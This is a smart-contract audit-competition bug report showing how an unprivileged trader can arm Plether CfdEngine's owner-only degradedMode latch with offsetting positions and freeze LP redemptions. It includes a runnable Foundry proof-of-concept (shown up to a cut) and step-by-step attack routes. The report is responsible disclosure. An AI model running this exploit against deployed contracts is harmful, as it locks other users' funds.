# \#97918 [SC-High] Unprivileged attacker can freeze all LP withdrawals on demand by arming CfdEngine's sticky degradedMode latch, leading to temporary freezing of funds for at least 24 hours

**Submitted on Nov 3rd 2026 at 22:24:08 UTC by @deltabear for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #97918
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Temporary freezing of funds for at least 24 hours

## Description

## Brief/Intro

Any unprivileged account can freeze every LP redemption of both tranches at a time it chooses. It holds an equal long and short on two accounts, laddered to the open limit, and gets the winning leg paid while the losing leg is still open. Two permissionless calls do that: the attacker's own Router close of whichever leg won (route A), or any keeper's `Router.executeLiquidation` of a thin winning leg at the Friday FAD start (route B). The payout sets `CfdEngine.degradedMode`.

The attacker then closes its losing leg. The pool can pay: it is solvent and holds about 10.0M USDG of free LP cash. The flag stays set and every LP epoch settlement reverts `HousePool__DegradedMode`. In route A an LP's matured 10,041,655.52 USDG Junior redemption is still unpaid 30 days after the arm; in route B 10,009,271.01 USDG is unpaid 27 days after it. The same trades in the opposite order pay the LP 1 h 5 min after the closes.

Only the owner can end it. The flag never re-checks itself, and 12 permissionless unlock attempts per route leave it set. The moment the owner calls `clearDegradedMode`, the same keeper call pays the LP in full. The freeze therefore lasts as long as the owner takes to react, and nothing in the repository sets a time for that.

The latch and its owner-only clear are documented, and this report does not dispute them. What no document, known issue or audit covers is that an unprivileged account can arm the latch on demand while the pool holds the cash to pay. The attacker deposits 221,445 USDG (route A) or 445,882.50 USDG (route B) and gets it back minus a cost of 1 USDG per 202 USDG frozen (route A) or per 450 (route B). That cost is a fixed share of the pool, so while a pool is small it costs little to freeze (see Impact Details).

## Vulnerability Details

Opens are admitted while `E >= L + B` (`CfdEnginePlanLib.sol:770-772`), with `E` the pool's assets net of trader claims, `L = max(longMaxProfit, shortMaxProfit)` (`CfdEngine.sol:1044-1050`) and `B` 25 bps of `L` (`DEPLOYMENT.md:143`). An equal long and short on two accounts add to `L` while their net skew stays zero, so the attacker ladders the pair until the cushion `E - L` is one buffer: 9,974,500 USDG per side on a 10,000,000 USDG Junior pool in both runs. The positions are leveraged: the attacker posts only margin, 1.5% and 0.6% of the position in route A, 4% and 0.35% in route B. This report does not claim that this reservation is wrong; it is only how the attacker reaches the arm.

The attacker then makes the pool pay the winning leg while the losing leg is still open:
- Route A. After an 86 bps move the attacker closes the winning leg through the Router. `_applyClose` settles it and then calls `_enterDegradedModeIfInsolvent` (`CfdEngine.sol:1306-1321`). The run uses a rise, so the SHORT wins; after a fall the LONG wins and the attacker closes that leg first instead.
- Route B. At the Friday FAD start the planner uses `fadMarginBps` (300, `DEPLOYMENT.md:136`) as the maintenance margin (`CfdEnginePlanLib.sol:1450`). A SHORT leg with a 35 bps pledge is still below that margin after a 53 bps move in its favour, so it is liquidatable while it is winning. Any keeper calls `Router.executeLiquidation`, which is permissionless and "Available while paused" (`OrderRouter.sol:485-493`). The liquidation pays the gain out of pool cash (`CfdEnginePlanLib.sol:1529-1543`), and `_applyLiquidation` calls `_enterDegradedModeIfInsolvent` (`CfdEngine.sol:1344`).

`_enterDegradedModeIfInsolvent` compares `pool.totalAssets() - totalTraderClaimBalanceAssets` (`CfdEngine.sol:865-871`) with `_maxLiability()` (`CfdEngine.sol:1364-1365`). The open losing leg still carries the same `L`, so `E < L` for a moment (by 5,581.78 USDG in route A and 5,113.24 USDG in route B) and `degradedMode = true` (`CfdEngine.sol:1366`). By its own rule the latch fires correctly here.

The attacker closes the losing leg. Its loss is paid into the pool, `L` falls to 0 and `E` is 10,041,657.54 USDG (route A). That is the documented condition for clearing, "once raw `E >= L`" (`EMERGENCY_RESPONSE_GUIDE.md:47`), but nothing clears it. `_enterDegradedModeIfInsolvent` returns at once when the flag is already set (`CfdEngine.sol:1355-1357`). The only statement in `packages/perps/src` that writes `degradedMode = false` is in `clearDegradedMode` (`CfdEngine.sol:665`), which is `onlyOwner` (`CfdEngine.sol:658-667`). There is no expiry and no permissionless re-check: the flag is a plain stored `bool` with no timestamp (`CfdEngine.sol:121`), and LP settlement reads that stored value (`HousePool.sol:1844-1850`, which calls `CfdEngineProtocolLens.sol:93-101`). Nothing on the settlement path re-checks solvency.

Every LP settlement path, the Router call and the permissionless frozen `HousePool.settleLpEpoch`, runs `_requireWithdrawalsLive` (`HousePool.sol:832`), which reverts `HousePool__DegradedMode` while the flag is set (`HousePool.sol:1864-1870`). Matured redemptions cannot be cancelled (`TrancheVault.sol:894-897`), so the LP's shares sit in escrow with no exit.

The defect is that an unprivileged account can create the `E < L` moment on demand, and the flag outlives it. `clearDegradedMode` already runs the right check (`CfdEngine.sol:662-664`); letting anyone call that check, or running it in the LP settlement path, ends the freeze as soon as `E >= L`.

### Why this is not the hedged-pair liquidity report, and not a known issue

- **Lack of liquidity.** A hedged-pair report on the reservation itself (matched to #97642) was closed under the lack-of-liquidity exclusion because "the redemption is funded in full once the attacker closes the pair". This report fails that test. In both routes the pair is fully closed (`L` = 0), the pool holds 10,041,657.54 and 10,009,273.02 USDG of free LP cash at every probe, and settlement still reverts `HousePool__DegradedMode` for 30 and 27 days. The cash is there; a status flag blocks it.
- **Different root cause and fix.** The root cause here is the latch: it can be armed by any account and only the owner releases it. Releasing it once `E >= L` ends this freeze and leaves the larger-side reservation untouched.
- **Documented is not disclosed.** The documents state the latch's design plainly, and this report relies on it as written:
  - it latches when close or liquidation settlement finds `E < L` (`SECURITY.md:340`, `ACCOUNTING_SPEC.md:1203-1209`);
  - it blocks "all LP epoch settlement" (`EMERGENCY_RESPONSE_GUIDE.md:46-47`), including "redemption funding" (`ACCOUNTING_SPEC.md:1224-1229`);
  - it "does not auto-clear merely because a later mark looks solvent" (`WHITEPAPER.md:1335-1337`); "only an authorized `clearDegradedMode()` call does that" (`ACCOUNTING_SPEC.md:619-620`), which the owner can make once raw `E >= L` (`EMERGENCY_RESPONSE_GUIDE.md:47`).

  Every one of these presents the latch as a response to real losses: containment "if a terminal transition reveals insolvency" (`SECURITY.md:27`), "a terminal transition that the protocol deliberately allowed to finish" (`WHITEPAPER.md:1335-1336`). None says that arming it is open to anyone: that an unprivileged account can create the `E < L` moment on purpose with its own offsetting trades, at a time it picks, then remove it by closing the other leg and leave the flag behind. Nor does any document weigh what that costs an attacker. Here it costs about 1 USDG per 202 USDG frozen (route A) or per 450 (route B), and the freeze lasts until the owner reacts, with no deadline set anywhere. No listed known issue or previous audit report covers it either. The only degraded-mode audit finding, Cecuro LOW-73 (`createPositionProtection` blocked while degraded), concerns a different function, and its fix does not touch the latch.

### Vulnerable source code

**1. Route A: every close runs the latch after paying the winner** @ packages/perps/src/CfdEngine.sol:1315-1320
```solidity
        settlementSidecar.executeClose(delta, currentPosition, publishTime);
        emit PositionClosed(delta.account, marginSide, delta.sizeDelta, delta.price, delta.realizedPnlAssets);

        unsettledCarryAssets[delta.account] = 0;

        _enterDegradedModeIfInsolvent(delta.account, 0);
```

**2. Route B: the FAD start raises the maintenance margin to 300 bps** @ packages/perps/src/libraries/CfdEnginePlanLib.sol:1450
```solidity
        uint256 maintMarginBps = snap.isFadWindow ? snap.riskParams.fadMarginBps : snap.riskParams.maintMarginBps;
```

**3. Route B: the liquidation pays the winner's gain from pool cash** @ packages/perps/src/libraries/CfdEnginePlanLib.sol:1529
```solidity
        delta.freshTraderPayoutAssets = delta.priceGainAssets - delta.actionChargeWithheldAssets;
```

**4. The latch returns early once set, then reads cash only** @ packages/perps/src/CfdEngine.sol:1351-1358
```solidity
    function _enterDegradedModeIfInsolvent(
        address account,
        uint256 pendingPoolPayoutAssets
    ) internal {
        if (degradedMode) {
            return;
        }
        uint256 effectiveAssetsAfter = _availableCashForFreshPoolPayouts();
```

**5. E is pool cash net of claims** @ packages/perps/src/CfdEngine.sol:865-870
```solidity
    function _availableCashForFreshPoolPayouts() internal view returns (uint256 availableCashAssets) {
        uint256 physicalAssets = pool.totalAssets();
        uint256 claimsAssets = totalTraderClaimBalanceAssets;
        assembly ("memory-safe") {
            if gt(physicalAssets, claimsAssets) { availableCashAssets := sub(physicalAssets, claimsAssets) }
        }
```

**6. The flag is set when E < L** @ packages/perps/src/CfdEngine.sol:1364-1367
```solidity
        uint256 maxLiabilityAssets = _maxLiability();
        if (effectiveAssetsAfter < maxLiabilityAssets) {
            degradedMode = true;
            emit DegradedModeEntered(effectiveAssetsAfter, maxLiabilityAssets, account);
```

**7. The only reset, owner only, already checks E >= L** @ packages/perps/src/CfdEngine.sol:658-666
```solidity
    function clearDegradedMode() external onlyOwner {
        if (!degradedMode) {
            revert CfdEngine__NotDegraded();
        }
        if (_availableCashForFreshPoolPayouts() < _maxLiability()) {
            revert CfdEngine__StillInsolvent();
        }
        degradedMode = false;
```

**8. Every LP settlement reverts while the flag is set** @ packages/perps/src/HousePool.sol:1864-1869
```solidity
    function _requireWithdrawalsLive(
        HousePoolEngineViewTypes.HousePoolStatusSnapshot memory statusSnapshot
    ) internal pure {
        if (statusSnapshot.degradedMode) {
            revert HousePool__DegradedMode();
        }
```

## Impact Details

- Impact row: "Temporary freezing of funds for at least 24 hours" (High). Asset: `packages/perps/src` (`CfdEngine.sol`); the frozen USDG sits in `HousePool.sol`.
- Route A: victim LP_J's matured Junior redemption, 10,041,655.52 USDG, is unpaid at +1 h 5 min, +24 h, +72 h, +168 h and +720 h (30 days) after the arm, with 10,041,657.54 USDG of free LP cash in the pool at every probe. In the control (same pair, same move, loser closed first) the first settle pays it 10,061,870.24 USDG 1 h 5 min after the closes.
- Route B: the redemption, 10,009,271.01 USDG, is unpaid at +1 h 5 min and +24 h (weekend freeze), +49 h, +72 h, +144 h and +648 h (27 days), with 10,009,273.02 USDG of free LP cash at every probe. The control (loser closed first, then the same liquidation) pays it 9,997,109.46 USDG 1 h 5 min after the closes.
- The flag does not clear itself. At +24 h and +720 h (route A) and at +72 h and +648 h (route B) the PoC runs six permissionless calls, each from the latched state: an outsider's `clearDegradedMode` (reverts, owner only), a fresh `updateMarkPrice`, a 1,000,000 USDG donation to the pool, a new trader's open, a new LP's deposit request, and the victim's own `settleLpEpoch`. After every call `degradedMode` is true and settlement reverts `HousePool__DegradedMode`.
- The freeze is the flag alone: the pool holds the cash, the revert is `HousePool__DegradedMode`, and after the owner's `clearDegradedMode` at the last probe the same keeper settle pays 10,041,655.52 USDG (route A) and 10,009,271.01 USDG (route B) at once.
- Owner response. Nothing in the repository sets a time for the owner's clear. The emergency guide says only "The Engine owner can call `clearDegradedMode()` once raw `E >= L`" (`EMERGENCY_RESPONSE_GUIDE.md:47`). The program's feasibility rules assume no detection deadline unless one is documented, and require 100% certainty of both detection and prevention when prevention relies on a human response.
- Prerequisites, all permissionless. Route A: two trader accounts funded with 221,445 USDG in total (margin of 1.5% on the LONG and 0.6% on the SHORT, plus fee room), an 86 bps move (a rise in the run), two Router closes in the attacker's order; afterwards both accounts withdraw 171,806.66 USDG. Route B: 445,882.50 USDG in total (4% on the LONG, so it stays above the 3% FAD margin after its loss and no keeper liquidates it first, and 0.35% on the SHORT), a 53 bps move in the thin leg's favour by the Friday FAD start, one `Router.executeLiquidation` by any keeper (which earns the keeper its bounty), one Router close; 423,641.43 USDG withdrawn.
- Cost against damage, deposit minus withdrawal: 49,638.34 USDG for 10,041,655.52 USDG frozen (about 1:202, route A) and 22,241.07 USDG for 10,009,271.01 USDG frozen (about 1:450, route B). Both are above the program's 1:100 line for griefing. Most of the cost is fees that end up in the pool, which is why `E` ends above its starting 10,000,000 USDG.
- **Small pools cost much less to freeze.** The attacker's positions must be about as large as the pool in size, not in money: they are leveraged, so the attacker only posts margin (221,445 USDG on a 10,000,000 USDG pool in route A). They have to fill the pool's open capacity, and fees are a percentage of position size, so the cost is a fixed share of the pool, about 0.49% (route A) or 0.22% (route B), not a fixed price. `test_C_attackerCostIsAShareOfThePool` arms the latch on four pool sizes with the same margins: a 100,000 USDG pool costs 497.43 USDG (route A) or 223.92 USDG (route B), and a 1,000,000 USDG pool costs 4,966.78 or 2,226.58. While a pool is still small, for example soon after launch, the attacker freezes every LP exit for a few hundred USDG.
- Victims see a revert with no remedy of their own: settlement reverts for every caller, a matured request cannot be cancelled, and the whole LP side of both tranches is closed. In route B that includes the frozen Friday-to-Sunday window, where LP redemption settlement is documented to stay live (`SECURITY.md:826-829`).
-While latched, new opens and LP deposit requests also revert (attempts 4 and 5), so the market takes no new risk or capital until the owner acts

## References

Latch
- packages/perps/src/CfdEngine.sol:1351-1368 - `_enterDegradedModeIfInsolvent`, cash only, early return once set
- packages/perps/src/CfdEngine.sol:865-871 - `_availableCashForFreshPoolPayouts` = pool assets minus trader claims
- packages/perps/src/CfdEngine.sol:1044-1050 - `_maxLiability`, larger side's max profit
- packages/perps/src/CfdEngine.sol:1320, :1344 - latch runs after every close and liquidation
- packages/perps/src/CfdEngine.sol:658-667 - `clearDegradedMode`, owner only, checks `E >= L`
- packages/perps/src/CfdEngine.sol:665 - the only `degradedMode = false` in `packages/perps/src`
- packages/perps/src/CfdEngine.sol:121 - `degradedMode` is a stored `bool`, no timestamp or expiry
- packages/perps/src/HousePool.sol:1844-1850, packages/perps/src/CfdEngineProtocolLens.sol:93-101 - LP settlement reads the stored flag

Routes
- packages/perps/src/libraries/CfdEnginePlanLib.sol:770-772 - opens need `E >= L + B`
- packages/perps/src/libraries/CfdEnginePlanLib.sol:1450 - FAD margin replaces maintenance margin
- packages/perps/src/libraries/CfdEnginePlanLib.sol:1529-1543 - liquidation pays the gain from pool cash
- packages/perps/src/OrderRouter.sol:485-493 - `executeLiquidation`, permissionless, available while paused
- packages/perps/src/CfdEngine.sol:1306-1321 - `_applyClose`
- packages/perps/DEPLOYMENT.md:136, :143 - `fadMarginBps` 300, `settlementBufferBps` 25

Freeze
- packages/perps/src/HousePool.sol:832 - LP settlement calls `_requireWithdrawalsLive`
- packages/perps/src/HousePool.sol:1864-1870 - reverts `HousePool__DegradedMode`
- packages/perps/src/TrancheVault.sol:894-897 - matured redemptions cannot be cancelled
- packages/perps/SECURITY.md:826-829 - LP redemption settlement stays live while the oracle is frozen

Documentation
- packages/perps/SECURITY.md:27, :340 - documented purpose of the latch
- packages/perps/EMERGENCY_RESPONSE_GUIDE.md:45-47 - the latch blocks all LP epoch settlement; the owner's clear, no deadline
- packages/perps/ACCOUNTING_SPEC.md:619-620, :1203-1229 - only an authorized `clearDegradedMode()` clears it; what it blocks
- packages/perps/WHITEPAPER.md:1335-1337 - does not auto-clear; a response to a terminal transition

## Link to Proof of Concept

https://gist.github.com/decies-centena-millia/e355cce96603945a3eeedc92a5ee21e0

## Proof of Concept

## Proof of Concept

One file, three tests. They run in the repo's Foundry suite at a82d4fef on the repo's own `BasePerpTest` with the `DEPLOYMENT.md` release parameters; only USDG and Pyth are the repo's mocks. Routes A and B each have a control from the same snapshot, probe LP settlement for 30 or 27 days after the arm, run six permissionless unlock attempts twice, and finish with the owner's clear. Test C repeats both routes on four pool sizes to measure the cost. Files: https://gist.github.com/decies-centena-millia/e355cce96603945a3eeedc92a5ee21e0

```bash
mkdir -p packages/perps/test/poc && cp DegradedLatchFreezePoC.t.sol packages/perps/test/poc/ && cd packages/perps && forge test --match-path test/poc/DegradedLatchFreezePoC.t.sol -vv
```

### attack step-by-step

Route A (`test_A_pairWinnerClose_latchFreezesLpExit_noSelfClearIn30Days`):
1. Monday 2024-10-14 10:00 UTC: LP_J deposits 10,000,000 USDG of Junior. The attacker deposits 221,445 USDG across ATTACKER and ATTACKER_B and ladders a LONG with a 150 bps pledge and an equal SHORT with a 60 bps pledge through the Router until the open buffer binds: 9,974,500 USDG per side.
2. 11:00 UTC: LP_J requests redemption of its whole position. The mark rises 86 bps: the SHORT wins.
3. ATTACKER_B closes the SHORT through the Router. The pool pays its gain from cash and `degradedMode` is set (`E - L` = -5,581.78 USDG).
4. ATTACKER closes the LONG through the Router. `L` is 0 and `E` is 10,041,657.54 USDG. Both accounts withdraw 171,806.66 USDG of the 221,445 deposited.
5. Every keeper `settleLpEpoch` at +1 h 5 min, +24 h, +72 h, +168 h and +720 h reverts `HousePool__DegradedMode`; LP_J's wallet stays at 0. The six unlock attempts at +24 h and +720 h leave the flag set.
6. The owner calls `clearDegradedMode`; the same keeper settle pays LP_J 10,041,655.52 USDG.

Route B (`test_B_fadStartKeeperLiquidation_latchFreezesLpExit_noSelfClearIn27Days`):
1. Friday 2024-10-18 17:30 UTC: LP_J deposits 10,000,000 USDG of Junior. The attacker deposits 445,882.50 USDG across ATTACKER and ATTACKER_B and ladders a LONG with a 400 bps pledge and an equal SHORT with a 35 bps pledge through the Router until the open buffer binds: 9,974,500 USDG per side.
2. 18:30 UTC: LP_J requests redemption of its whole position. The first FAD mark is 53 bps up: the SHORT wins.
3. 20:30 UTC, the FAD start: KEEPER calls `Router.executeLiquidation` on ATTACKER_B. The pool pays the SHORT's gain from cash and `degradedMode` is set (`E - L` = -5,113.24 USDG).
4. ATTACKER closes the LONG through the Router. `L` is 0 and `E` is 10,009,273.02 USDG. Both accounts withdraw 423,641.43 USDG of the 445,882.50 deposited.
5. Every keeper settle at +1 h 5 min and +24 h (oracle frozen, `HousePool.settleLpEpoch`) and at +49 h, +72 h, +144 h and +648 h (live, `Router.settleLpEpoch`) reverts `HousePool__DegradedMode`; LP_J's wallet stays at 0. The six unlock attempts at +72 h and +648 h leave the flag set.
6. The owner calls `clearDegradedMode`; the same keeper settle pays LP_J 10,009,271.01 USDG.

Test C (`test_C_attackerCostIsAShareOfThePool`): routes A and B rerun on pools of 100,000, 1,000,000, 3,000,000 and 10,000,000 USDG with the same margins. The latch arms and stays set with the pair flat every time, and the full cost is about 0.49% (A) and 0.22% (B) of the pool.

## main Attack code

```solidity
// route A, the arm (ATTACKER = LONG loser, ATTACKER_B = SHORT winner, px = mark + 86 bps)
_closeNow(ATTACKER_B, CfdTypes.Side.SHORT, _sizeOf(ATTACKER_B), px);   // Router commit + execute: pays the winner, sets degradedMode
_closeNow(ATTACKER, CfdTypes.Side.LONG, _sizeOf(ATTACKER), px);        // L = 0, E = 10.04M, the flag stays

// every LP exit afterwards, for 30 days
bytes[] memory d = _px(px);
vm.prank(KEEPER);
router.settleLpEpoch(d);                                               // reverts HousePool__DegradedMode

// route B, the arm (ATTACKER = LONG loser, ATTACKER_B = thin SHORT winner, px = mark + 53 bps)
_warpTo(FRI_FAD_START);
_liquidate(KEEPER, ATTACKER_B, px);                                    // any keeper's Router.executeLiquidation: pays the winner, sets degradedMode
_closeNow(ATTACKER, CfdTypes.Side.LONG, _sizeOf(ATTACKER), px);        // L = 0, E = 10.01M, the flag stays
```

```
plant : an equal long and short on two accounts, laddered to the open buffer
fire  : the attacker's Router close of the winning leg (route A), or any keeper's liquidation of the thin winning leg at the Friday FAD start (route B), while the losing leg is open
```

### full poc code, single file, single runnable command

The whole file, `DegradedLatchFreezePoC.t.sol`, is below and in the gist (743 lines): a `PocBase` fixture over the repo's `packages/perps/test/perps/BasePerpTest.sol` with the release parameters, then `DegradedLatchFreezePoC` with routes A and B and the pool-size test C. The run's complete `-vv` output is [`output.log`](https://gist.github.com/decies-centena-millia/e355cce96603945a3eeedc92a5ee21e0#file-output-log). Command, from the repo root at a82d4fef:

```bash
mkdir -p packages/perps/test/poc && cp DegradedLatchFreezePoC.t.sol packages/perps/test/poc/ && cd packages/perps && forge test --match-path test/poc/DegradedLatchFreezePoC.t.sol -vv
```

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../perps/BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {TrancheVault} from "@plether/perps/TrancheVault.sol";
import {ICfdEngineTypes} from "@plether/perps/interfaces/ICfdEngineTypes.sol";
import {IHousePool} from "@plether/perps/interfaces/IHousePool.sol";
import {IOrderRouterAdminHost} from "@plether/perps/interfaces/IOrderRouterAdminHost.sol";
import {console2} from "forge-std/console2.sol";

abstract contract PocBase is BasePerpTest {
    uint256 internal constant PX = 1e8;

    address internal constant ATTACKER = address(0xA11CE);
    address internal constant ATTACKER_B = address(0xA11CF);
    address internal constant VICTIM = address(0xB0B);
    address internal constant KEEPER = address(0x4B33);
    address internal constant HONEST = address(0x4011);
    address internal constant LP_J = address(0x1117);
    address internal constant LP_S = address(0x5E);

    // Monday 2024-10-14 10:00 UTC; Friday 20:30 UTC FAD start; 21:00 UTC oracle freeze; Sunday 21:00 UTC reopen.
    uint256 internal constant WEEK_MON_10UTC = 1_728_900_000;
    uint256 internal constant FRI_LAST_LIVE = 1_729_283_399;
    uint256 internal constant FRI_FAD_START = 1_729_283_400;
    uint256 internal constant FRI_FROZEN_START = 1_729_285_200;
    uint256 internal constant SUN_REOPEN = 1_729_458_000;

    // DEPLOYMENT.md release parameters.
    function _riskParams() internal pure virtual override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialJuniorDeposit() internal pure virtual override returns (uint256) {
        return 0;
    }

    function _initialSeniorDeposit() internal pure virtual override returns (uint256) {
        return 0;
    }

    function _initialJuniorSeedDeposit() internal pure virtual override returns (uint256) {
        return 1e6;
    }

    function _initialSeniorSeedDeposit() internal pure virtual override returns (uint256) {
        return 1e6;
    }

    function setUp() public virtual override {
        super.setUp();
        uint256 start = vm.getBlockTimestamp();
        IHousePool.PoolConfig memory poolConfig = _currentPoolConfig();
        poolConfig.maxSeniorExposureAssets = 40_000_000e6;
        poolConfig.maxSeniorShareBps = 8000;
        pool.proposePoolConfig(poolConfig);
        vm.warp(pool.poolConfigActivationTime());
        pool.finalizePoolConfig();
        IOrderRouterAdminHost.RouterConfig memory routerConfig = _routerConfig();
        routerConfig.adverseConfidenceMultiplierBps = 2500;
        routerConfig.minOpenNotionalAssets = 1000e6;
        _setRouterConfig(routerConfig);
        vm.warp(start);
        vm.roll(vm.getBlockNumber() + 1);
    }

    // Via-IR caches block.timestamp inside one frame, so time is read from the cheatcode.
    function _now() internal view returns (uint256) {
        return vm.getBlockTimestamp();
    }

    function _advance(uint256 seconds_) internal {
        vm.warp(vm.getBlockTimestamp() + seconds_);
        vm.roll(vm.getBlockNumber() + 1);
    }

    function _warpTo(uint256 timestamp) internal {
        vm.warp(timestamp);
        vm.roll(vm.getBlockNumber() + 1);
    }

    function _warpIntoNextEpoch(uint256 seconds_) internal {
        _warpTo(((_now() / 1 hours) + 1) * 1 hours + seconds_);
    }

    function _seedPool(uint256 junior, uint256 senior) internal {
        if (junior > 0) _fundJunior(LP_J, junior);
        if (senior > 0) _fundSenior(LP_S, senior);
    }

    function _requestRedeemAll(TrancheVault vault, address lp) internal returns (uint256 requestId, uint256 shares) {
        shares = vault.maxRequestRedeem(lp);
        vm.prank(lp);
        requestId = vault.requestRedeem(shares, lp, lp);
    }

    function _claimRedeemAll(TrancheVault vault, address lp, uint256 requestId) internal returns (uint256 assets) {
        uint256 shares = vault.claimableRedeemRequest(requestId, lp);
        vm.prank(lp);
        assets = vault.claimRedeem(requestId, shares, lp, lp);
    }

    function _px(uint256 price) internal returns (bytes[] memory) {
        return _mockPythUpdateData(price);
    }

    function _refreshMark(uint256 price) internal {
        bytes[] memory data = _px(price);
        vm.prank(KEEPER);
        router.updateMarkPrice(data);
    }

    function _settleEpoch(uint256 price) internal {
        bytes[] memory data = _px(price);
        vm.prank(KEEPER);
        router.settleLpEpoch(data);
    }

    function _sizeFor(uint256 notionalAssets, uint256 price) internal pure returns (uint256) {
        return ((notionalAssets * 1e20 / price) / CfdTypes.SIZE_QUANTUM) * CfdTypes.SIZE_QUANTUM;
    }

    function _commitOpen(address account, CfdTypes.Side side, uint256 size, uint256 margin) internal returns (uint64 orderId) {
        vm.prank(account);
        orderId = router.commitOrder(side, size, margin, 0, false);
    }

    function _commitClose(address account, CfdTypes.Side side, uint256 size) internal returns (uint64 orderId) {
        vm.prank(account);
        orderId = router.commitOrder(side, size, 0, 0, true);
    }

    function _exec(uint64 orderId, uint256 price) internal returns (OrderV3Types.ExecutionResult memory result) {
        bytes[] memory data = _px(price);
        vm.prank(KEEPER);
        result = router.executeOrder(orderId, data);
    }

    function _executed(OrderV3Types.ExecutionResult memory result) internal pure returns (bool) {
        return result.terminalReason == OrderV3Types.TerminalReason.Executed;
    }

    function _openNow(address account, CfdTypes.Side side, uint256 size, uint256 margin, uint256 price)
        internal
        returns (uint64 orderId)
    {
        orderId = _commitOpen(account, side, size, margin);
        require(_executed(_exec(orderId, price)), "open did not fill");
    }

    function _closeNow(address account, CfdTypes.Side side, uint256 size, uint256 price) internal returns (uint64 orderId) {
        orderId = _commitClose(account, side, size);
        require(_executed(_exec(orderId, price)), "close did not fill");
    }

    function _liquidate(address keeper, address account, uint256 price) internal {
        bytes[] memory data = _px(price);
        vm.prank(keeper);
        router.executeLiquidation(account, data);
    }

    function _tryOpenNow(address account, CfdTypes.Side side, uint256 size, uint256 margin, uint256 price)
        internal
        returns (bool filled)
    {
        vm.prank(account);
        (bool ok, bytes memory ret) = address(router).call(
            abi.encodeWithSignature(
                "commitOrder(uint8,uint256,uint256,uint256,bool)", uint8(side), size, margin, uint256(0), false
            )
        );
        if (!ok) return false;
        return _executed(_exec(abi.decode(ret, (uint64)), price));
    }

    // Long on one account, short on the other, laddered through the Router until the open solvency buffer stops it.
    function _buildHedgedPair(address longAccount, address shortAccount, uint256 marginBps, uint256 price)
        internal
        returns (uint256 notionalPerSide)
    {
        uint256 step = (pool.totalAssets() * 39) / 100;
        uint256 quantumAssets = (CfdTypes.SIZE_QUANTUM * price) / 1e20;
        while (step >= router.minOpenNotionalAssets()) {
            uint256 size = _sizeFor(step, price);
            uint256 lots = size * price / 1e20;
            if (lots < quantumAssets || !_tryOpenNow(longAccount, CfdTypes.Side.LONG, size, lots * marginBps / 10_000, price)) {
                step /= 2;
                continue;
            }
            if (!_tryOpenNow(shortAccount, CfdTypes.Side.SHORT, size, lots * marginBps / 10_000, price)) {
                _closeNow(longAccount, CfdTypes.Side.LONG, size, price);
                step /= 2;
                continue;
            }
            notionalPerSide += lots;
        }
    }

    function _sizeOf(address account) internal view returns (uint256 size) {
        (size,,,,,,) = engine.positions(account);
    }

    function _marginOf(address account) internal view returns (uint256 margin) {
        (, margin,,,,,) = engine.positions(account);
    }

    // E of the degraded-mode test: pool assets net of trader claims.
    function _effectiveAssets() internal view returns (uint256) {
        uint256 poolAssets = pool.totalAssets();
        uint256 claims = engine.totalTraderClaimBalanceAssets();
        return poolAssets > claims ? poolAssets - claims : 0;
    }

    function _logState(string memory tag) internal view {
        console2.log("---", tag);
        console2.log("  time                 ", _now());
        console2.log("  mark / markTime      ", engine.lastMarkPrice(), engine.lastMarkTime());
        console2.log("  pool P               ", pool.totalAssets());
        console2.log("  claims C             ", engine.totalTraderClaimBalanceAssets());
        console2.log("  max liability L      ", _maxLiability());
        console2.log("  free cash            ", pool.getFreeAssets());
        console2.log("  degradedMode         ", engine.degradedMode());
    }

    // USDG atoms (6 decimals) as "1234567.890123".
    function _usd(uint256 atoms) internal pure returns (string memory) {
        bytes memory f = bytes(vm.toString(atoms % 1e6 + 1e6));
        bytes memory frac = new bytes(6);
        for (uint256 i; i < 6; ++i) frac[i] = f[i + 1];
        return string.concat(vm.toString(atoms / 1e6), ".", string(frac));
    }

    function _usdSigned(int256 atoms) internal pure returns (string memory) {
        return atoms < 0 ? string.concat("-", _usd(uint256(-atoms))) : string.concat("+", _usd(uint256(atoms)));
    }

    function _row(string memory a, string memory b, string memory c, string memory d) internal pure {
        console2.log(string.concat("    ", _pad(a, 30), _pad(b, 22), _pad(c, 22), d));
    }

    function _pad(string memory s, uint256 width) internal pure returns (string memory) {
        bytes memory b = bytes(s);
        if (b.length >= width) return string.concat(s, " ");
        bytes memory out = new bytes(width);
        for (uint256 i; i < width; ++i) out[i] = i < b.length ? b[i] : bytes1(" ");
        return string(out);
    }

    function _hm(uint256 s) internal pure returns (string memory) {
        return string.concat(vm.toString(s / 1 hours), " h ", vm.toString((s % 1 hours) / 1 minutes), " min");
    }
}

contract DegradedLatchFreezePoC is PocBase {
    address internal constant OUTSIDER = address(0x0DD);
    uint256 internal constant JUNIOR = 10_000_000e6;
    // Each attacker account deposits only its margin plus fee room, as a share of the 9,975,000 USDG position.
    uint256 internal constant POS_CAP = 9_975_000e6;
    uint256 internal constant A_WIN_BPS = 60;
    uint256 internal constant A_LOSE_BPS = 150;
    uint256 internal constant B_WIN_BPS = 35;
    uint256 internal constant B_LOSE_BPS = 400;
    uint256 internal constant FEE_ROOM_BPS = 6;
    uint256 internal constant PAIR_MOVE_BP = 86;
    uint256 internal constant FAD_MOVE_BP = 53;
    bytes4 internal constant DEGRADED = IHousePool.HousePool__DegradedMode.selector;

    uint256 internal requestId;

    struct Probe {
        uint256 t;
        bool frozen;
        uint256 free;
        bool settleOk;
        bytes4 err;
        uint256 wallet;
    }

    struct Result {
        string route;
        uint256 frozenAssets;
        uint256 frozenFor;
        uint256 minFree;
        uint256 controlPaid;
        uint256 controlAfter;
        int256 armCost;
        uint256 deposit;
        uint256 withdrawn;
        uint256 attackWallet;
        uint256 attempts;
    }

    function _b(bool v) internal pure returns (string memory) {
        return v ? "true" : "false";
    }

    function _errName(bytes4 err) internal pure returns (string memory) {
